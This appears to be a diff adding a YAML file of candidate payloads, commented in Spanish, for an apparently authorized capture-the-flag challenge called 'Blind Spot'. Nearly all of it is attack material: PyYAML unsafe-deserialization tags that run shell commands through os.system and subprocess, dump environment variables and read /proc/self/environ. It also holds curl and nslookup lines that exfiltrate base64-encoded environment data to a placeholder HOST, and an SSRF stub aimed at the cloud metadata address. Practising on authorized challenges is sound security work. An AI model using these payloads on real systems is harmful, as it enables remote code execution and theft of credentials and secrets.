@@ -1,0 +1,45 @@
+# Payloads candidatos para el reto "Blind Spot" (vista previa YAML).
+# Ejecutar SOLO contra challenges.hackrocks.com (reto autorizado).
+
+# --- 0. Benigno: ver cómo normaliza la estructura -------------------------
+---
+nombre: demo
+version: 1
+items:
+  - a
+  - b
+
+# --- 1. PyYAML UnsafeLoader: os.system (RCE, sin salida) ------------------
+# !!python/object/apply:os.system ["id > /tmp/pwned"]
+# Para ver salida, mejor check_output (abajo) si el render imprime el objeto.
+
+# --- 2. PyYAML: subprocess.check_output (RCE con salida) ------------------
+# !!python/object/apply:subprocess.check_output
+# - - /bin/sh
+#   - -c
+#   - id; env
+
+# --- 3. Volcar entorno en la respuesta ------------------------------------
+# !!python/object/apply:subprocess.check_output
+# - - /bin/sh
+#   - -c
+#   - env | sort
+
+# --- 4. Variante: leer /proc/self/environ ---------------------------------
+# !!python/object/apply:subprocess.check_output
+# - - /bin/cat
+#   - - /proc/self/environ
+
+# --- 5. Variante: object/new con os.environ -------------------------------
+# !!python/object/apply:os.getenv ["FLAG"]
+
+# --- 6. RCE ciega + exfiltración OOB (si "blind spot" = sin salida) -------
+# Sustituir HOST por listener propio (interactsh / ngrok / VPS).
+# !!python/object/apply:os.system ["curl http://HOST/$(env | base64 -w0 | tr -d '\\n')"]
+# !!python/object/apply:os.system ["nslookup $(id | base64 -w0).HOST"]
+
+# --- 7. Si el parser rechaza !!python, probar merge/anchors y SSRF --------
+# base: &b
+#   url: http://169.254.169.254/latest/meta-data/
+# doc:
+#   <<: *b
